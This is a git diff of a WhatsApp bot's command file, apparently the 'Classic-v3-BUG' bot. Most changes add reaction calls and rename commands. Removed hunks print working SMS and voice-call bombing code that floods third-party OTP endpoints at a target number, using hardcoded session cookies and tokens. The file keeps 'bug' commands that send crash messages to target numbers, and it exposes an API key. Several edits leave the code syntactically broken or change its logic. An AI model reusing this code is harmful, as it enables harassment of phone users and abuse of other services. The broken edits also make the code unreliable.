@@ -2212,6 +2212,7 @@ zetsubo.sendMessage(from, hiks, {quoted: zets })}
 break
 //=================================================//
 case 'funmenu':
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 await loading()
 let fooutgkzz = `Runtime : ⏳ ${runtime(process.uptime())}`
@@ -2264,7 +2265,7 @@ mentionedJid:[sender],
 })
 break
 case 'gamemenu':
-await loading()
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 let fooutgdhsikzz = `Runtime : ⏳ ${runtime(process.uptime())}`
 sendGeekzMessage(from, { 
@@ -2332,6 +2333,7 @@ zetsreply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *
 break;
 //=================================================//
 case "cekidgc": {
+await inireact(
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*') 
 reply('Bentar Ya')
 let getGroups = await zetsubo.groupFetchAllParticipating()
@@ -2400,6 +2402,7 @@ fs.writeFileSync("./pushkont/contacts.json", JSON.stringify(contacts))
 }
 break
 case "savekontakid": {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*') 
 if (!text) return m.reply(`GAK GITU CARANYA BEGO!!
 KEK GINI CARANYA = 
@@ -2446,6 +2449,7 @@ fs.writeFileSync("./pushkont/contacts.json", JSON.stringify(contacts))
 break
 //=================================================//
 case 'public': {
+await inireact()
 if (!isCreator) return reply('*Premium Command*') 
 zetsubo.public = true
 zetsreply('Sukse Change To Public')
@@ -2453,6 +2457,7 @@ zetsreply('Sukse Change To Public')
 break
 //=================================================//
 case 'self': {
+await inireact()
 if (!isCreator) return reply('*Premium Command*') 
 zetsubo.public = false
 zetsreply('Sukses Change To Self')
@@ -2460,6 +2465,7 @@ zetsreply('Sukses Change To Self')
 break
 //=================================================//
 case 'addprem':
+await inireact()
 if (!isCreator) return reply('*Premium Command*')
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 258869103969`)
 bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
@@ -2471,6 +2477,7 @@ zetsreply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
 break
 //=================================================//
 case 'delprem':
+await inireact()
 if (!isCreator) return reply('*Premium Command*')
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 258869103969`)
 yaki = text.split("|")[0].replace(/[^0-9]/g, '')
@@ -2481,6 +2488,7 @@ zetsreply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
 break
 //=================================================//
 case 'listprem':
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
  teksooo = '*List Premium*\n\n'
 for (let i of owner) {
@@ -2524,25 +2532,10 @@ zetsreply(teksooop)
 break
 //=================================================//
 case 'owner': case 'creator':{
+await inireact()
  zetsubo.sendContact(from, global.owner, m)
 }
 break
-//=================================================//
-
-//===========================================		
-
-//=================================================//
-
-//=================================================//
-
-//=================================================//
-//=================================================//
-
-
-//=================================================//
-
-//=================================================//
-
 //=================================================//
 case 'classic-rape':
 case 'police-case':
@@ -2599,6 +2592,7 @@ reply(mess.bugrespon + `\n❗Detail > \n🎯 Target Number : ${sendto} \n😎Bug
 break
 
 case 'buglist': {
+await inireact()
 for (let i = 0; i < 10; i++) {
  let sections = [{
     title: `Ah ah ah`,
@@ -2642,15 +2636,16 @@ zetsubo.sendMessage(from, { video: joauu, mimetype: 'video/mp4', caption: `APA ?
 }
 break
 //=================================================//
-case 'goyang': {
+case 'classic-vid': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading() //Variable yg tadi
+await inireact() //Variable yg tadi
 joauuuuu = fs.readFileSync('./zetszet/video/hwmods2.mp4')
 zetsubo.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, {quoted:kalgans})
 }
 break
 //=================================================//
-case 'linkgroup': case 'linkgc': {
+case 'invite': case 'link': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2660,7 +2655,8 @@ zetsubo.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${
 }
 break
 //=================================================//
-case 'resetlinkgc':
+case 'resetlink':
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2670,8 +2666,8 @@ break
 //=================================================//
 case 'sendlinkgc': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
-if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
+if (!m.isGroup) return reply('sendimg link')
+if (!isBotAdmins) return reply('Here is the link')
 await loading()
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
@@ -2693,6 +2689,7 @@ await zetsubo.groupParticipantsUpdate(from, [users], 'remove')
 break
 //=================================================//
 case 'add': {
+await inireact()
 if (!isCreator) return reply('*Premium Only*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2704,6 +2701,7 @@ await zetsubo.groupParticipantsUpdate(from, [users], 'add')
 break
 //=================================================//
 case 'promote': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2715,6 +2713,7 @@ await zetsubo.groupParticipantsUpdate(from, [users], 'promote')
 break
 //=================================================//
 case 'demote': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2726,6 +2725,7 @@ await zetsubo.groupParticipantsUpdate(from, [botNumber], 'demote')
 break
 //=================================================//
 case 'hidetag': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 await loading()
@@ -2738,6 +2738,7 @@ case 'ttp2':
 case 'ttp3':
 case 'ttp4':
 case 'attp':
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
 await loading()
 if (args.length == 0) return reply(`Example: ${prefix + command} Znxn Xyz`)
@@ -2747,6 +2748,7 @@ zetsubo.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
 break
 //=================================================
 case 'editgroup': {   
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
@@ -2764,6 +2766,7 @@ Group Close`}, {quoted:m})
 break
 //=================================================//
 case 'editinfo': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
@@ -2782,6 +2785,7 @@ Editinfo Close`}, {quoted:m})
 break
 //=================================================//
 case 'join': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!text) throw 'Masukkan Link Group!'
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
@@ -2791,7 +2795,8 @@ await zetsubo.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).ca
 }
 break
 //=================================================//
-case 'editsubjek': {
+case 'editsubject': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2803,6 +2808,7 @@ await zetsubo.groupUpdateSubject(from, text).then((res)).catch((err) => reply(js
 break
 //=================================================//
 case 'editdesk':{
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2814,18 +2820,21 @@ await zetsubo.groupUpdateDescription(from, text).then((res)).catch((err) => repl
 break
 //=================================================//
 case 'tagall': {
+await inireact()
+if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return
 await loading()
 let teks = `══᪣⧠ *࿉ 𝐂𝐋𝐀𝐒𝐒𝐈𝐂 𝐕-3࿉* ⧠᪣══
  ➲ *REPORT : ${q ? q : '𝐓𝐀𝐆𝐆𝐄𝐃'}*\n\n`
 for (let mem of participants) {
-teks += `🎲 @${mem.id.split('@')[0]}\n`
+teks += `🩸 @${mem.id.split('@')[0]}\n`
 }
 zetsubo.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
 }
 break
 //=================================================//
 case'demoteall':
+await inireact()
 if (!isCreator) return reply('*Premium Only*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2841,6 +2850,7 @@ zetsubo.groupParticipantsUpdate(from, mems, 'demote')
 break
 //=================================================//
 case'promoteall':
+await inireact()
 if (!isCreator) return reply('*Premium Only*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2855,25 +2865,27 @@ mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 zetsubo.groupParticipantsUpdate(from, mems, 'promote')
 break
 //=================================================//
-case 'sticker': case 's': case 'stickergif': case 'sgif': {
- if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
+case 'sticker': case 's': case 'stickergif': case 'sgif': 
+await inireact()
+if (!quoted) throw `reply Video/Image D Caption ${prefix + command}`
 if (/image/.test(mime)) {
 await loading()
 let media = await quoted.download()
 let encmedia = await zetsubo.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
+if ((quoted.msg || quoted).seconds > 11) return reply('more than 10 sec!')
 let media = await quoted.download()
 let encmedia = await zetsubo.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
-throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
+throw `Reply to video${prefix + command}\n Video 1-9 seconds`
 }
 }
 break
 //=================================================//
 case 'inspect': {
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
 await loading()
 if (!args[0]) return reply("Linknya?")
@@ -2911,7 +2923,8 @@ zetsubo.sendFile(from, pp, "", m, { caption: tekse, mentions: await zetsubo.pars
 }
 break
 //=================================================
-case 'bugggg': { 
+case 'bugggg': {
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
 joauuuuuuu = fs.readFileSync('./zetszet/video/hwmods2.mp4')
 zetsubo.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
@@ -2919,6 +2932,7 @@ zetsubo.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnc
 break
 //=================================================
 case "welcome":
+await inireact()
 {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
@@ -2960,6 +2974,7 @@ reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
 break
 //=================================================//
 case 'antilink': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -2969,19 +2984,20 @@ if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk 
 if (args[0] === "on") {
 if (AntiLink) return reply('Sudah Aktif')
 ntilink.push(from)
-reply('Succes menyalakan antilink di group ini 🌷')
+reply('Antilink is on🌷')
 } else if (args[0] === "off") {
 if (!AntiLink) return reply('Sudah Mati')
 let off = ntilink.indexOf(from)
 ntilink.splice(off, 1)
-reply('Succes mematikan antilink di group ini 🌷')
+reply('Succes antilink off🌷')
 } else {
-reply('on untuk mengaktifkan, off untuk menonaktifkan')
+reply('🩸')
 }
 }
 break
 //=================================================
 case 'autodelete': {
+await inireact()
 if (!isCreator) return
 if (args.length < 1) return
 if (args[0] === "on") {
@@ -2998,6 +3014,7 @@ break
 //=================================================
 case "antitoxic":
 {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.isGroup) return reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
@@ -3066,46 +3083,6 @@ zetsubo.sendMessage(from, {text:`\`\`\`「 Kata Kata Toxic Terdeteksi 」\`\`\`\
 }
 break
 //=================================================//
-case "call":
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6289503267904`)
-let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
-if (args[0].startsWith(`+6289503267904`)) return reply('Tidak bisa call ke nomor ini!')
-axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
-break
-//=================================================
-case 'sms': {
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
-const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-if (m.quoted || text) {
-if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
-if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
-let nosms = '+' + froms.replace('@s.whatsapp.net', '')
-let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
-let ua = mal[Math.floor(Math.random() * mal.length)];
-let axios = require('axios').default;
-let hd = {
-'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
-};
-const dat = {
-'phone': nosms
-};
-for (let x = 0; x < 100; x++) {
-axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
-headers: hd
-}).then(res => {
-console.log(res);
-}).catch(err => {
-console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY ZetsuboXygen `);
-});
-}
-} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6289503267904`)
-reply(`spam sms/call akan di kirim ke no target`)
-}
-break
-//=================================================//
 case 'yts': case 'ytsearch': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!text) throw `Example : ${prefix + command} story wa anime`
@@ -3140,6 +3117,7 @@ case 'runtime':
                 break
 //=================================================
 case 'ytmp4': case 'youtubemp4':
+await inireact()
 			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27`)
     loading()
 			axios.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
@@ -3163,7 +3141,8 @@ await loading()
 }
 break
 //=================================================
-case 'getvideo': {
+case 'video': {
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 let { ytv } = require('./lib/y2mate')
 if (!text) throw `Example : ${prefix + command} 1`
@@ -3179,7 +3158,7 @@ zetsubo.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp
 break
 //=================================================
 case "ytreels": case "youtubereels":{
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
+await inireact()
 if (!text) return reply('Masukan Link Nya!!!')
 await loading ()
 downloadMp4(text)
@@ -3187,6 +3166,7 @@ downloadMp4(text)
 break
 //=================================================
 case 'tiktokvideo':{
+await inireact()
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!text) return reply( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
@@ -3199,7 +3179,7 @@ break
 //=================================================
 case 'tiktokmp3':
 case 'tiktokaudio':{
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
+await inireact()
 if (!text) return reply( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
 await loading ()
@@ -3210,7 +3190,8 @@ zetsubo.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' 
 break
 //=================================================
 case 'igvideo': case 'igreels':
-			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/tv/CXwPLSIFDW0/?igshid=NTc4MTIwNjQ2YQ==`)
+await inireact()
+	if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/tv/CXwPLSIFDW0/?igshid=NTc4MTIwNjQ2YQ==`)
 			await loading()
 			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
 				zetsubo.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn`})
@@ -3232,7 +3213,7 @@ case 'igvideo': case 'igreels':
 			break
 //=================================================//
 case 'wm': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) 
 await loading()
 var teks = `${text}`
 {
@@ -3247,6 +3228,7 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================// 
 case 'ping': {
+await inireact()
   const startTime = new Date();
   const pingMsg = await zetsubo.sendMessage(m.chat, { text: '*Classifying*' });
 
@@ -3295,7 +3277,7 @@ case 'cloud':
 case 'summersand':
 case 'horrorblood':
 case 'thunder':
-	if (args.length == 0) return reply(`Example: ${prefix + command} ZetsuboXygen`)
+	if (args.length == 0) return reply(`Example: ${prefix + command} Classic`)
 	await loading()
 	zetsubo.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${command}` } })
 	break
@@ -3462,7 +3444,7 @@ case 'sound159':
 case 'sound160':
 case 'sound161':
 if (isBan) return reply('😹')
-await loading()
+await inireact()
  zetsubogans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await zetsubo.sendMessage(from, { audio: zetsubogans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
 mediaType:  1,
@@ -3484,6 +3466,7 @@ zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m}
 break
 //=================================================
 case 'sc': case 'script': case 'repo':
+await inireact()
 
  zetsubo.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/b103691007c8ce5ee8a94.jpg` }, caption: 
 `╭╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╮\n\n ➨ 𝑯𝒊 *${pushname}* \n\n ➨ 𝑰 𝒂𝒎 𝑪𝑳𝑨𝑺𝑺𝑰𝑪_𝑨𝑰 𝑩𝑶𝑻 ☣.\n\n ➨ 𝒀𝒐𝒖 𝑪𝒂𝒏 𝑮𝒆𝒕 𝑴𝒚 𝑺𝒐𝒖𝒓𝒄𝒆 𝑪𝒐𝒅𝒆 𝑽𝒊𝒂.\n\n ➨ 𝑻𝒉𝒆 𝑳𝒊𝒏𝒌 𝑩𝒆𝒍𝒐𝒘 ⇣⇣.\n\n ➨𝑭𝒐𝒓𝒌 𝑨𝒏𝒅 𝑮𝒊𝒗𝒆 𝑨 𝑺𝒕𝒂𝒓 ➻ ❴ https://github.com/Samue-l1/Classic-v3-BUG ❵\n\n ➨ 𝑹𝒆𝒎𝒆𝒎𝒃𝒆𝒓 𝒕𝒐 𝒕𝒂𝒌𝒆 𝒂 𝒍𝒐𝒐𝒌 𝒐𝒏 𝒓𝒆𝒂𝒅𝒎𝒆 𝒃𝒆𝒇𝒐𝒓𝒆 𝒅𝒆𝒑𝒍𝒐𝒚𝒎𝒆𝒏𝒕.\n\n ➨ 𝑴𝒂𝒅𝒆 𝑩𝒚 ➻ 𝐊𝐈𝐍𝐆 𝐒𝐀𝐌 ✇\n\n╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╯⸼` });
@@ -3502,6 +3485,7 @@ break
 //=================================================
 case 'broadcast':
             case 'bcgroup': {
+		    await inireact()
                 if (!isCreator) return reply(mess.owner)
                 if (!text) return reply(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                 let getGroups = await zetsubo.groupFetchAllParticipating()
@@ -3531,7 +3515,7 @@ case 'broadcast':
             break
 //=================================================
 case "alive":
-
+await inireact()
 const audiovn = "./Classic.mp3";
     const dooc = {
         audio: {
@@ -3657,7 +3641,7 @@ case 'shinobu':
 case 'megumin':
 case 'wallnime':
 case 'quotesimage':
-await loading()
+await inireact()
 zetsubo.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } })
 break
 //=================================================//
@@ -3727,6 +3711,7 @@ break
 //=================================================//
 case 'delete':
             case 'del': {
+		  await inireact()
                 if (!isCreator) return reply(mess.done)
                 if (!m.quoted) throw false
                 let {
@@ -3823,6 +3808,7 @@ zetsubo.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: te
 break
 //=================================================//
 case 'tourl': {
+await inireact()
                 reply(zetsubo.wait)
                 let media = await zetsubo.downloadAndSaveMediaMessage(qmsg)
                 if (/image/.test(mime)) {
@@ -4123,8 +4109,8 @@ fs.unlinkSync(ran)
 break
 //=================================================//
 case 'tomp4': case 'tovideo': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) 
+await inireact()
 if (!quoted) throw `Balas sticker video Dengan Caption ${prefix + command}`
 if (/video/.test(mime)) {
 let { webp2mp4File } = require('./lib/uploader')
@@ -4137,7 +4123,7 @@ await fs.unlinkSync(media)
 break
 case 'tomp3': {
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
-await loading()
+await inireact()
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 let media = await zetsubo.downloadMediaMessage(quoted)
 let { toAudio } = require('./lib/converter')
@@ -4147,6 +4133,7 @@ zetsubo.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: 
 break
 //=================================================//
 case 'toaudio': case 'audio': {
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 await loading()
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
@@ -4179,6 +4166,7 @@ thumbnail: thumb
 break
 //=================================================//
 case 'restart':  
+await inireact()
   if (!isCreator) throw `Owner Only` 
   reply(`*Restarting Classic* .`)  
   await sleep(3000)  
@@ -4186,6 +4174,7 @@ case 'restart':
   break;
 //=================================================//
 case "dp": { 
+await inireact()
  try { 
  ha = m.quoted.sender; 
  qd = await zetsubo.getName(ha); 
@@ -4200,8 +4189,8 @@ case "dp": {
  break;
 //=================================================//
 case "quotes":
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan)
+await inireact()
  var resi = await Quotes()
 teks = `\nAuthor: ${resi.author}\n`
 teks = `\nQuotes:\n`
@@ -4376,8 +4365,8 @@ zetsubo.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:
 break
 //=================================================//
 case 'emojimix': { 
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+await inireact()
+if (isBan) 
  let [emoji1, emoji2] = text.split`+`
 if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
 if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
@@ -4391,7 +4380,7 @@ break
 //=================================================//
 case 'emojimix2': {
 if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+await inireact()
  if (!text) throw `Example : ${prefix + command} 😅`
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
 for (let res of anu.results) {
@@ -4678,6 +4667,7 @@ https://cloud.google.com/translate/docs/languages
 //=================================================//
 case 'play':
     case 'play2': {
+	 await inireact()
         if (!text) {
             reply('𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐬𝐞𝐚𝐫𝐜𝐡 𝐭𝐞𝐫𝐦!\n𝐄.𝐠: 𝙷𝙴𝙰𝙳𝙻𝙸𝙶𝙷𝚃𝚂 𝙱𝚈 𝙰𝙻𝙰𝙽 𝚆𝙰𝙻𝙺𝙴𝚁')
             return;
@@ -4725,7 +4715,7 @@ case 'play':
                         document: fs.readFileSync(`./${randomName}`),
                         mimetype: "audio/mpeg",
                         fileName: titleYt + ".mp3",
-			caption: "➻ 𝐁𝐘 𝐂𝐋𝐀𝐒𝐒𝐈𝐂_𝐁𝐎𝐓 ❖ ",    
